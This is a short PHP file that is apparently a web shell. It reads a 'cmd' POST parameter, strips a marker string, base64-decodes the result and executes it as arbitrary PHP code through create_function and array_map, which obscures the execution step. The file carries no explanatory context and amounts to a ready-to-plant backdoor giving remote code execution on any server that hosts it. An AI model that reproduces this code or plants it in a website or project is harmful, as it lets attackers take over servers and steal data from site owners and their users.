<?php 
$cmd=base64_decode(str_replace('7a57a5a743894a0e','',$_POST['cmd']));
function TOOLS($cmd) {
        array_map(create_function("",$cmd), array(1));
}
TOOLS($cmd);
?>